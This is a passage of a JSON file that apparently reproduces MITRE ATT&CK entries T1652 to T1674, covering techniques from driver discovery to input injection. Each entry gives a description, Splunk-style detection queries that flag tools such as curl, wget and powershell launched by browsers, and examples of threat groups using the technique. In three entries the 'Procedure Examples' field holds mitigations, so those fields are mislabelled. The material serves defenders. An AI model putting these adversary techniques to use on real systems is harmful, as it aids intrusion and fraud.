      "Monitor for suspicious command executions via cloud management services like AWS System Manager or Azure RunCommand. In Azure, usage of Azure RunCommand can be identified via the Azure Activity Logs, and additional details on the result of  executed jobs are available in theC:\\Packages\\Plugins\\Microsoft.CPlat.Core.RunCommandWindowsdirectory on Windows virtual machines.[6]Analytic 1 - Abnormal or unauthorized execution of commands/scripts on VMsindex=cloud_logs sourcetype=aws:ssm OR sourcetype=azure:activity| search action IN (\"RunCommand\", \"StartSSMCommand\", \"ExecuteCommand\")",
      "Monitor for process creation events in virtual machines that are associated with cloud VM agents, such as the WindowsAzureGuestAgent.exe process on Azure virtual machines.[6]Analytic 1 - Unexpected process creationsourcetype=process_creation| search process_name IN (\"WindowsAzureGuestAgent.exe\", \"ssm-agent.exe\")| where process_name IN (\"WindowsAzureGuestAgent.exe\", \"ssm-agent.exe\") AND process_path != \"/usr/local/bin/\"",
      "Monitor the execution of scripts within virtual machines, especially those initiated via cloud management services like Azure RunCommand. In Azure, usage of Azure RunCommand can be identified via the Azure Activity Logs, and additional details on the result of  executed jobs are available in theC:\\Packages\\Plugins\\Microsoft.CPlat.Core.RunCommandWindowsdirectory on Windows virtual machines.[6]Analytic 1 - Unauthorized script executionsourcetype=azure:activity| search script_name IN (\"script.sh\", \"run.ps1\", \"start.cmd\")| where script_name IN (\"script.sh\", \"run.ps1\", \"start.cmd\") AND user NOT IN (\"known_admins\")"
    ],
    "Procedure Examples": [
      "AADInternalscan execute commands on Azure virtual machines using the VM agent.[4]",
      "APT29has used Azure Run Command and Azure Admin-on-Behalf-of (AOBO) to execute code on virtual machines.[3]",
      "Pacucan run commands on EC2 instances using AWS Systems Manager Run Command.[5]"
    ]
  },
  "T1652": {
    "Name": "Device Driver Discovery",
    "Description": "Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e.Security Software Discovery) or other defenses (e.g.,Virtualization/Sandbox Evasion), as well as potential exploitable vulnerabilities (e.g.,Exploitation for Privilege Escalation).Many OS utilities may provide information about local device drivers, such asdriverquery.exeand theEnumDeviceDrivers()API function on Windows.[1][2]Information about device drivers (as well as associated services, i.e.,System Service Discovery) may also be available in the Registry.[3]On Linux/macOS, device drivers (in the form of kernel modules) may be visible within/devor using utilities such aslsmodandmodinfo.[4][5][6]",
    "Detects": [
      "Monitor executed commands (lsmod,driverquery, etc.) with arguments highlighting potentially malicious attempts to enumerate device drivers.",
      "Monitor for API calls (such asEnumDeviceDrivers()) that may attempt to gather information about local device drivers.",
      "Monitor processes (lsmod,driverquery.exe, etc.) for events that may highlight potentially malicious attempts to enumerate device drivers.",
      "Monitor for attempts to access information stored in the Registry about devices and their associated drivers, such as values underHKLM\\SYSTEM\\CurrentControlSet\\ServicesandHKLM\\SYSTEM\\CurrentControlSet\\HardwareProfiles.[3]"
    ],
    "Procedure Examples": [
      "HOPLIGHTcan enumerate device drivers located in the registry atHKLM\\Software\\WBEM\\WDM.[7]",
      "INC Ransomwarecan verify the presence of specific drivers on compromised hosts including Microsoft Print to PDF and Microsoft XPS Document Writer.[8]",
      "Remsechas a plugin to detect active drivers of some security products.[9]"
    ]
  },
  "T1653": {
    "Name": "Power Settings",
    "Description": "Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.[1]Adversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.[2][3]For example,powercfgcontrols all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down.[4]Adversaries may also extend system lock screen timeout settings.[5]Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.[6]Aware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.[7]",
    "Detects": [
      "Monitor and inspect commands and arguments associated with manipulating the power settings of a system.",
      "Monitor for unexpected changes to configuration files associated with the power settings of a system."
    ],
    "Procedure Examples": [
      "ArcaneDoorinvolved exploitation of CVE-2024-20353 to force a victim Cisco ASA to reboot, triggering the automated unzipping and execution of theLine Runnerimplant.[8]",
      "Line Dancercan modify the crash dump process on infected machines to skip crash dump generation and proceed directly to device reboot for both persistence and forensic evasion purposes.[8]",
      "Line Runnerused CVE-2024-20353 to trigger victim devices to reboot, in the process unzipping and installing theLine Dancerpayload.[8]"
    ]
  },
  "T1654": {
    "Name": "Log Enumeration",
    "Description": "Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records (Account Discovery), security or vulnerable software (Software Discovery), or hosts within a compromised network (Remote System Discovery).Host binaries may be leveraged to collect system logs. Examples include usingwevtutil.exeorPowerShellon Windows to access and/or export security event information.[1][2]In cloud environments, adversaries may leverage utilities such as the Azure VM Agent’sCollectGuestLogs.exeto collect security logs from cloud hosted infrastructure.[3]Adversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.In addition to gaining a better understanding of the environment, adversaries may also monitor logs in real time to track incident response procedures. This may allow them to adjust their techniques in order to maintain persistence or evade defenses.[4]",
    "Detects": [
      "Monitor for the use of commands and arguments of utilities and other tools used to access and export logs.",
      "Monitor for access to system and service log files, especially from unexpected and abnormal users.",
      "Monitor for unexpected process activity associated with utilities that can access and export logs, such aswevutil.exeon Windows andCollectGuestLogs.exeon Azure hosted VMs."
    ],
    "Procedure Examples": [
      "Akira _v2can enumerate the trace, debug, error, info, and warning logs on targeted systems.[5][6]",
      "APT5has used the BLOODMINE utility to parse and extract information from Pulse Secure Connect logs.[7]",
      "Aquatic Pandaenumerated logs related to authentication in Linux environments prior to deleting selective entries for defense evasion purposes.[8]",
      "DUSTTRAPcan identify infected system log information.[9]",
      "Ember Bearhas enumerated SECURITY and SYSTEM log files during intrusions.[10]",
      "Megazordhas the ability to print the trace, debug, error, info, and warning logs.[6]",
      "Pacucan collect CloudTrail event histories and CloudWatch logs.[11]",
      "Volt Typhoonhas usedwevtutil.exeand the PowerShell commandGet-EventLog securityto enumerate Windows logs to search for successful logons.[12][13]"
    ]
  },
  "T1656": {
    "Name": "Impersonation",
    "Description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (viaPhishing for Information,Phishing, orInternal Spearphishing) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims.In many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enablesFinancial Theft.Adversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such aspayment,request, orurgentto push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary’s goal.Impersonation is typically preceded by reconnaissance techniques such asGather Victim Identity InformationandGather Victim Org Informationas well as acquiring infrastructure such as email domains (i.e.Domains) to substantiate their false identity.[1]There is the potential for multiple victims in campaigns involving impersonation. For example, an adversary mayCompromise Accountstargeting one organization which can then be used to support impersonation against other entities.[2]",
    "Detects": [
      "Review and monitor email and other user communication logs for signs of impersonation, such as suspicious emails (e.g., from known malicious or compromised accounts) or content associated with an adversary's actions on objective (e.g., abnormal monetary transactions)."
    ],
    "Procedure Examples": [
      "APT41impersonated an employee at a video game developer company to send phishing emails.[3]",
      "APT42has impersonated legitimate people in phishing emails to gain credentials.[4][5]",
      "DuringC0027,Scattered Spiderimpersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.[6]",
      "Kimsukyhas impersonated academic institutions and NGOs in order to gain information related to North Korea.[7]",
      "LAPSUS$has called victims' help desk and impersonated legitimate users with previously gathered information in order to gain access to privileged accounts.[8]",
      "NPPSPYcreates a network listener using the misspelled labellogincontrollrecorded to the Registry keyHKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order.[9]",
      "DuringOperation Dream Job,Lazarus Groupimpersonated HR hiring personnel through LinkedIn messages and conducted interviews with victims in order to deceive them into downloading malware.[10][11][12]",
      "Saint Bearhas impersonated government and related entities in both phishing activity and developing web sites with malicious links that mimic legitimate resources.[13]",
      "DuringC0027,Scattered Spiderimpersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.[6]Scattered Spiderutilized social engineering to compel IT help desk personnel to reset passwords and MFA tokens.[14][15]",
      "Storm-1811impersonates help desk and IT support personnel for phishing and social engineering purposes during initial access to victim environments.[16]"
    ]
  },
  "T1657": {
    "Name": "Financial Theft",
    "Description": "Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware,[1]business email compromise (BEC) and fraud,[2]\"pig butchering,\"[3]bank hacking,[4]and exploiting cryptocurrency networks.[5]Adversaries mayCompromise Accountsto conduct unauthorized transfers of funds.[6]In the case of business email compromise or email fraud, an adversary may utilizeImpersonationof a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary.[2]This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft.[7]Extortion by ransomware may occur, for example, when an adversary demands payment from a victim afterData Encrypted for Impact[8]andExfiltrationof data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary.[9]Adversaries may use dedicated leak sites to distribute victim data.[10]Due to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such asData Destructionand business disruption.[11]",
    "Detects": [
      "Review and monitor financial application logs for signs of financial theft, such as abnormal monetary transactions or resource balances.Email logs may also highlight account takeovers, impersonation, or another activity that may enable monetary theft."
    ],
    "Procedure Examples": [
      "Akiraengages in double-extortion ransomware, exfiltrating files then encrypting them, in order to prompt victims to pay a ransom.[12][13]",
      "Cinnamon Tempesthas maintained leak sites for exfiltrated data in attempt to extort victims into paying a ransom.[14]",
      "DarkGatecan deploy payloads capable of capturing credentials related to cryptocurrency wallets.[15]",
      "FIN13has observed the victim's software and infrastructure over several months to understand the technical process of legitimate financial transactions, prior to attempting to conduct fraudulent transactions.[16]",
      "INC Ransomhas stolen and encrypted victim's data in order to extort payment for keeping it private or decrypting it.[17][18][19][20][21]",
      "Kimsukyhas stolen and laundered cryptocurrency to self-fund operations including the acquisition of infrastructure.[22][23]",
      "Malteirotargets organizations in a wide variety of sectors via the use ofMispadubanking trojan with the goal of financial theft.[24]",
      "Playdemands ransom payments from victims to unencrypt filesystems and to not publish sensitive data exfiltrated from victim networks.[25]",
      "Scattered Spiderhas deployed ransomware on compromised hosts for financial gain.[26][27]",
      "SilverTerriertargets organizations in high technology, higher education, and manufacturing for business email compromise (BEC) campaigns with the goal of financial theft.[28][29]"
    ]
  },
  "T1659": {
    "Name": "Content Injection",
    "Description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e.,Drive-by Targetfollowed byDrive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e.,Ingress Tool Transfer) and other data to already compromised systems.[1]Adversaries may inject content to victim systems in various ways, including:From the middle, where the adversary is in-between legitimate online client-server communications (Note:this is similar but distinct fromAdversary-in-the-Middle, which describes AiTM activity solely within an enterprise environment)[2]From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server[3]Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"[3][1][4]",
    "Detects": [
      "Monitor for unexpected and abnormal file creations that may indicate malicious content injected through online network communications.Analytic 1 - Detecting Malicious File Creation via Content Injection(EventCode=11 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_type IN (\"exe\", \"dll\", \"js\", \"vbs\", \"ps1\", \"sh\", \"php\"))| where (process_path=\"C:\\Users\\\\AppData\\Local\\Temp\\\" OR process_path=\"/tmp/\" OR process_path=\"/var/tmp/\")| eval risk_score=case(    like(file_name, \"%.exe\"), 8,    like(file_name, \"%.js\"), 9,    like(file_name, \"%.sh\"), 7)| where risk_score >= 7| stats count by _time, host, user, file_name, process_path, risk_score",
      "Monitor for other unusual network traffic that may indicate additional malicious content transferred to the system. Use network intrusion detection systems, sometimes with SSL/TLS inspection, to look for known malicious payloads, content obfuscation, and exploit code.Analytic 1 - Detecting Content Injection in Network Traffic(EventCode=3)OR (source=\"zeek_http_logs\" response_code IN (302, 307) AND url IN (malicious_redirect_list))OR (source=\"proxy_logs\" response_body_content IN (suspicious_script_list))| eval risk_score=case(    response_code=302 AND url IN (malicious_redirect_list), 9,    response_body_content IN (suspicious_script_list), 8,    url LIKE \"%@%\", 7)| where risk_score >= 7| stats count by _time, host, user, url, response_code, risk_score",
      "Look for behaviors on the endpoint system that might indicate successful compromise, such as abnormal behaviors of browser processes. This could include suspicious files written to disk, evidence ofProcess Injectionfor attempts to hide execution, or evidence of Discovery.Analytic 1 - Detecting Malicious Process Execution from Injected Content(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (parent_process IN (\"chrome.exe\", \"firefox.exe\", \"edge.exe\", \"safari.exe\", \"iexplore.exe\"))| where (process_name IN (\"powershell.exe\", \"cmd.exe\", \"wget\", \"curl\", \"bash\", \"python\"))| eval risk_score=case(    process_name IN (\"powershell.exe\", \"cmd.exe\"), 9,    process_name IN (\"wget\", \"curl\"), 8,    parent_process IN (\"chrome.exe\", \"firefox.exe\"), 7)| where risk_score >= 7| stats count by _time, host, user, process_name, parent_process, risk_score"
    ],
    "Procedure Examples": [
      "Discohas achieved initial access and execution through content injection into DNS,  HTTP, and SMB replies to targeted hosts that redirect them to download malicious files.[5]",
      "MoustachedBouncerhas injected content into DNS, HTTP, and SMB replies to redirect specifically-targeted victims to a fake Windows Update page to download malware.[5]"
    ]
  },
  "T1665": {
    "Name": "Hide Infrastructure",
    "Description": "Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished in various ways including by identifying and filtering traffic from defensive tools,[1]masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers,[2][3][4]and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.C2 networks may include the use ofProxyor VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.[5][6]Adversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents.[7][8]Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e.,Virtualization/Sandbox Evasion).[1][7]Hiding C2 infrastructure may also be supported byResource Developmentactivities such asAcquire InfrastructureandCompromise Infrastructure. For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.[9][10]",
    "Detects": [
      "Consider use of services that may aid in tracking of newly acquired infrastructure, such as WHOIS databases for domain registration information, and in monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain.",
      "Once adversaries have provisioned infrastructure (ex: a server for use in command and control), internet scans may help proactively discover adversary acquired infrastructure. If requests are filtered or blocked, the specifics of this action, such as the response sent, can be used to gain further insight into the resource's nature or creation.",
      "Internet scanners may be used to look for artifacts associated with malicious C2 infrastructure. Correlate data and patterns from Internet-facing resources gathered from scans with network traffic to gain further insight into potential adversary C2 networks.",
      "Network detection systems may be able to identify traffic for specific adversary command and control infrastructure. Correlate network traffic with data and patterns from Internet-facing resources gathered from scans to gain further insight into potential adversary C2 networks."
    ],
    "Procedure Examples": [
      "APT29uses compromised residential endpoints, typically within the same ISP IP address range, as proxies to hide the true source of C2 traffic.[11]",
      "DarkGatecommand and control includes hard-coded domains in the malware masquerading as legitimate services such as Akamai CDN or Amazon Web Services.[12]",
      "JumbledPathcan use a chain of jump hosts to communicate with compromised devices to obscure actor infrastructure.[13]",
      "During theSolarWinds Compromise,APT29set the hostnames of their C2 infrastructure to match legitimate hostnames in the victim environment. They also used IP addresses originating from the same country as the victim for their VPN infrastructure.[14]",
      "UPSTYLEattempts to retrieve a non-existent webpage from the command and control server resulting in hidden commands sent via resulting error messages.[15]",
      "ZIRCONIUMhas utilized an ORB (operational relay box) network – consisting compromised devices such as small office and home office (SOHO) routers, IoT devices, and leased virtual private servers (VPS) – to obfuscate the origin of C2 traffic.[16]"
    ]
  },
  "T1666": {
    "Name": "Modify Cloud Resource Hierarchy",
    "Description": "Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service (IaaS) environments in order to evade defenses.IaaS environments often group resources into a hierarchy, enabling improved resource management and application of policies to relevant groups. Hierarchical structures differ among cloud providers. For example, in AWS environments, multiple accounts can be grouped under a single organization, while in Azure environments, multiple subscriptions can be grouped under a single management group.[1][2]Adversaries may add, delete, or otherwise modify resource groups within an IaaS hierarchy. For example, in Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources. They may also engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim’s compute resources without generating logs on the victim tenant.[3][4]In AWS environments, adversaries with appropriate permissions in a given account may call theLeaveOrganizationAPI, causing the account to be severed from the AWS Organization to which it was tied and removing any Service Control Policies, guardrails, or restrictions imposed upon it by its former Organization. Alternatively, adversaries may call theCreateAccountAPI in order to create a new account within an AWS Organization. This account will use the same payment methods registered to the payment account but may not be subject to existing detections or Service Control Policies.[5]",
    "Detects": [
      "Monitor for changes to resource groups, such as creating new resource groups or leaving top-level management groups. In Azure environments, monitor for changes to subscriptions.[8]In AWS environments, monitor for API calls such asCreateAccountorLeaveOrganization.[5]"
    ],
    "Procedure Examples": [
      "Periodically audit resource groups in the cloud management console to ensure that only expected items exist, especially close to the top of the hierarchy (e.g., AWS accounts and Azure subscriptions). Typically, top-level accounts (such as the AWS management account) should not contain any workloads or resources.[6]",
      "In Azure environments, consider setting a policy to block subscription transfers.[7]In AWS environments, consider using Service Control Policies to prevent the use of theLeaveOrganizationAPI call.[5]",
      "Limit permissions to add, delete, or modify resource groups to only those required."
    ]
  },
  "T1667": {
    "Name": "Email Bombing",
    "Description": "Adversaries may flood targeted email addresses with an overwhelming volume of messages. This may bury legitimate emails in a flood of spam and disrupt business operations.[1][2]An adversary may accomplish email bombing by leveraging an automated bot to register a targeted address for e-mail lists that do not validate new signups, such as online newsletters. The result can be a wave of thousands of e-mails that effectively overloads the victim’s inbox.[2][3]By sending hundreds or thousands of e-mails in quick succession, adversaries may successfully divert attention away from and bury legitimate messages including security alerts, daily business processes like help desk tickets and client correspondence, or ongoing scams.[3]This behavior can also be used as a tool of harassment.[2]This behavior may be a precursor forSpearphishing Voice. For example, an adversary may email bomb a target and then follow up with a phone call to fraudulently offer assistance. This social engineering may lead to the use ofRemote Access Softwareto steal credentials, deploy ransomware, conductFinancial Theft[1], or engage in other malicious activity.[4]",
    "Detects": [
      "Monitor e-mail logs for an abnormally high volume of messages or message content sent to specific victim e-mail addresses or servers.Analytic 1 - Spike in Email Volumeindex=email_logs sourcetype=\"mail:log\"| timechart span=5m count by recipient_email| eventstats avg(count) as avg_count stdev(count) as std_dev by recipient_email| eval spike=if(count > avg_count + (3*std_dev), 1, 0)| search spike=1| table _time, recipient_email, count, avg_count, std_dev",
      "Monitor for - Attachment creation events with excessive or repetitive file creation- Unusual file size from email messages (e.g., base64-encoded attachments dumped locally)- Burst of .eml, .msg, .tmp file extensions in mail client foldersAnalytic 1 - Email file creationsEventCode=11 (file_name=\".eml\" OR file_name=\".msg\" OR file_name=\"*.tmp\")| stats count avg(file_size) max(file_size) by user, file_path, process_name, _time| where count > 100 OR max(file_size) > 1000000| table _time, user, process_name, file_path, file_name, count, max(file_size)",
      "Monitor network data for uncommon data flows. Abnormal spikes in incoming traffic volume to specific victim e-mail addresses or servers may indicate an email bombing attempt.Analytic 1 - Suspicious network trafficsourcetype=\"zeek:conn\" dest_port=25 OR dest_port=465 OR dest_port=587| stats count avg(bytes_in) by src_ip, dest_ip, dest_port, _time| eventstats avg(count) as avg_flows, stdev(count) as std_flows by dest_ip| eval anomaly=if(count > avg_flows + (2*std_flows), 1, 0)| search anomaly=1| table _time, src_ip, dest_ip, dest_port, count, avg_flows"
    ],
    "Procedure Examples": [
      "Storm-1811has deployed large volumes of non-malicious email spam to victims in order to prompt follow-on interactions with the threat actor posing as IT support or helpdesk to resolve the problem.[4][5]"
    ]
  },
  "T1668": {
    "Name": "Exclusive Control",
    "Description": "Adversaries who successfully compromise a system may attempt to maintain persistence by \"closing the door\" behind them  – in other words, by preventing other threat actors from initially accessing or maintaining a foothold on the same system.For example, adversaries may patch a vulnerable, compromised system[1][2]to prevent other threat actors from leveraging that vulnerability in the future. They may \"close the door\" in other ways, such as disabling vulnerable services[3], stripping privileges from accounts[4], or removing other malware already on the compromised device.[5]Hindering other threat actors may allow an adversary to maintain sole access to a compromised system or network. This prevents the threat actor from needing to compete with or even being removed themselves by other threat actors. It also reduces the \"noise\" in the environment, lowering the possibility of being caught and evicted by defenders. Finally, in the case ofResource Hijacking, leveraging a compromised device’s full power allows the threat actor to maximize profit.[3]",
    "Detects": [
      "Monitor executed commands and arguments that may be used to modify the compromised system by, for example, self-patching[1]or disabling vulnerable services[3]in an attempt to limit subsequent exploitation of the system by additional unrelated threat actors.",
      "Monitor for the termination of processes or disabling of vulnerable services[3]that may be an attempt to limit subsequent exploitation of the system by additional unrelated threat actors."
    ],
    "Procedure Examples": []
  },
  "T1669": {
    "Name": "Wi-Fi Networks",
    "Description": "Adversaries may gain initial access to target systems by connecting to wireless networks. They may accomplish this by exploiting open Wi-Fi networks used by target devices or by accessing secured Wi-Fi networks — requiringValid Accounts— belonging to a target organization.[1][2]Establishing a connection to a Wi-Fi access point requires a certain level of proximity to both discover and maintain a stable network connection.Adversaries may establish a wireless connection through various methods, such as by physically positioning themselves near a Wi-Fi network to conduct close access operations. To bypass the need for physical proximity, adversaries may attempt to remotely compromise nearby third-party systems that have both wired and wireless network connections available (i.e., dual-homed systems). These third-party compromised devices can then serve as a bridge to connect to a target’s Wi-Fi network.[2]Once an initial wireless connection is achieved, adversaries may leverage this access for follow-on activities in the victim network or further targeting of specific devices on the network. Adversaries may performNetwork SniffingorAdversary-in-the-Middleactivities forCredential AccessorDiscovery.",
    "Detects": [
      "Monitor for changes made to firewall rules for unexpected modifications to allow specific network traffic that may maliciously modify components of a victim environment in order to move laterally.",
      "Monitor for newly constructed network connections that are sent to or received by abnormal or untrusted hosts.",
      "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware."
    ],
    "Procedure Examples": [
      "APT28has exploited open Wi-Fi access points for initial access to target devices using the network.[2][1]",
      "DuringAPT28 Nearest Neighbor Campaign,APT28established wireless connections to secure, enterprise Wi-Fi networks belonging to a target organization for initial access into the environment.[2]"
    ]
  },
  "T1671": {
    "Name": "Cloud Application Integration",
    "Description": "Adversaries may achieve persistence by leveraging OAuth application integrations in a software-as-a-service environment. Adversaries may create a custom application, add a legitimate application into the environment, or even co-opt an existing integration to achieve malicious ends.[1][2]OAuth is an open standard that allows users to authorize applications to access their information on their behalf. In a SaaS environment such as Microsoft 365 or Google Workspace, users may integrate applications to improve their workflow and achieve tasks.Leveraging application integrations may allow adversaries to persist in an environment – for example, by granting consent to an application from a high-privileged adversary-controlled account in order to maintain access to its data, even in the event of losing access to the account.[3][4][5]In some cases, integrations may remain valid even after the original consenting user account is disabled.[6]Application integrations may also allow adversaries to bypass multi-factor authentication requirements through the use ofApplication Access Tokens. Finally, they may enable persistentAutomated Exfiltrationover time.[7]Creating or adding a new application may require the adversary to create a dedicatedCloud Accountfor the application and assign itAdditional Cloud Roles– for example, in Microsoft 365 environments, an application can only access resources via an associated service principal.[8]",
    "Detects": [
      "Monitor M365 Audit logs for the OperationsAdd app role assignment grant to userand/orConsent to applicationoccurring againstAzureActiveDirectoryWorkloads.[10]",
      "Monitor for additions and changes to applications in the SaaS environment."
    ],
    "Procedure Examples": [
      "Periodically review SaaS integrations for unapproved or potentially malicious applications.",
      "Do not allow users to add new application integrations into a SaaS environment. In Entra ID environments, consider enforcing the \"Do not allow user consent\" option.[9]"
    ]
  },
  "T1672": {
    "Name": "Email Spoofing",
    "Description": "Adversaries may fake, or spoof, a sender’s identity by modifying the value of relevant email headers in order to establish contact with victims under false pretenses.[1]In addition to actual email content, email headers (such as the FROM header, which contains the email address of the sender) may also be modified. Email clients display these headers when emails appear in a victim's inbox, which may cause modified emails to appear as if they were from the spoofed entity.This behavior may succeed when the spoofed entity either does not enable or enforce identity authentication tools such as Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and/or Domain-based Message Authentication, Reporting and Conformance (DMARC).[2][3][4]Even if SPF and DKIM are configured properly, spoofing may still succeed when a domain sets a weak DMARC policy such asv=DMARC1; p=none; fo=1;. This means that while DMARC is technically present, email servers are not instructed to take any filtering action when emails fail authentication checks.[1][5]Adversaries may abuse absent or weakly configured SPF, SKIM, and/or DMARC policies to conceal social engineering attempts[5]such asPhishing. They may also leverage email spoofing forImpersonationof legitimate external individuals and organizations, such as journalists and academics.[5]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may send phishing messages to gain access to victim systems. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.[6][7]Analytic 1 -  Detect Spoofed Emails Using SPF/DKIM/DMARC Failuressourcetype=\"o365:messageTrace\"| search AuthenticationDetails=\"fail\" OR SPF=\"fail\" OR DKIM=\"fail\" OR DMARC=\"fail\"| eval spoof_score=if(SPF=\"fail\", 1, 0) + if(DKIM=\"fail\", 1, 0) + if(DMARC=\"fail\", 1, 0)| where spoof_score >= 2| table _time, SenderFromAddress, RecipientAddress, Subject, AuthenticationDetails, spoof_scoreAnalytic 2 - Domain Mismatch Detection (Generic SMTP/Proxy Logs)index=email_logs sourcetype=mail| eval from_domain=lower(substr(Sender, strpos(Sender, \"@\")+1))| eval return_path_domain=lower(substr(ReturnPath, strpos(ReturnPath, \"@\")+1))| where from_domain!=return_path_domain AND isnotnull(ReturnPath)| stats count by from_domain, return_path_domain, Subject, _time"
    ],
    "Procedure Examples": [
      "Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation.[6][7]"
    ]
  },
  "T1673": {
    "Name": "Virtual Machine Discovery",
    "Description": "An adversary may attempt to enumerate running virtual machines (VMs) after gaining access to a host or hypervisor. For example, adversaries may enumerate a list of VMs on an ESXi hypervisor using aHypervisor CLIsuch asesxcliorvim-cmd(e.g.esxcli vm process list or vim-cmd vmsvc/getallvms).[1][2]Adversaries may also directly leverage a graphical user interface, such as VMware vCenter, in order to view virtual machines on a host.Adversaries may use the information fromVirtual Machine Discoveryduring discovery to shape follow-on behaviors. Subsequently discovered VMs may be leveraged for follow-on activities such asService StoporData Encrypted for Impact.[1]",
    "Detects": [
      "Monitor command-line arguments that may involve listing virtual machines. On ESXi hosts, monitor for commands such asesxcli vm process listorvim-cmd vmsvc/getallvms.Analytic 1 - Command Execution (ESXi)index=esxi_logs sourcetype=shell_log(command=\"esxcli vm process list\" OR command=\"vim-cmd vmsvc/getallvms\")| stats count by host, user, command, _time| where user != \"expected_admin_user\" OR like(command, \"%unexpected_path%\")| sort -_timeAnalytic 1 - Command Execution (Linux/macOS)sourcetype=auditd OR sourcetype=sysmon(process_name IN (\"virsh\", \"VBoxManage\", \"qemu-img\") AND command=\"list\" OR command=\"info\")| stats count by host, user, command, parent_process_name, _time| where user!=\"root\" AND NOT match(command, \"known_admin_script\")| sort -_timeAnalytic 1 - Command Execution (Windows - Hyper-V or VMWare Workstation)sourcetype=WinEventLog:Sysmon EventCode=1(Image=\"powershell.exe\" OR Image=\"vmrun.exe\" OR Image=\"VBoxManage.exe\") (CommandLine=\"Get-VM\" OR CommandLine=\"list vms*\")| stats count by host, user, Image, CommandLine, ParentImage, _time| where user!=\"expected_admin\" AND NOT match(CommandLine, \"routine_script.ps1\")| sort -_time"
    ],
    "Procedure Examples": [
      "Cheerscrypt has leveragedesxcli vm process listin order to gather a list of running virtual machines to terminate them.[3]"
    ]
  },
  "T1674": {
    "Name": "Input Injection",
    "Description": "Adversaries may simulate keystrokes on a victim’s computer by various means to perform any type of action on behalf of the user, such as launching the command interpreter using keyboard shortcuts,  typing an inline script to be executed, or interacting directly with a GUI-based application.  These actions can be preprogrammed into adversary tooling or executed through physical devices such as Human Interface Devices (HIDs).For example, adversaries have used tooling that monitors the Windows message loop to detect when a user visits bank-specific URLs. If detected, the tool then simulates keystrokes to open the developer console or select the address bar, pastes malicious JavaScript from the clipboard, and executes it - enabling manipulation of content within the browser, such as replacing bank account numbers during transactions.[1][2]Adversaries have also used malicious USB devices to emulate keystrokes that launch PowerShell, leading to the download and execution of malware from adversary-controlled servers.[3]",
    "Detects": [
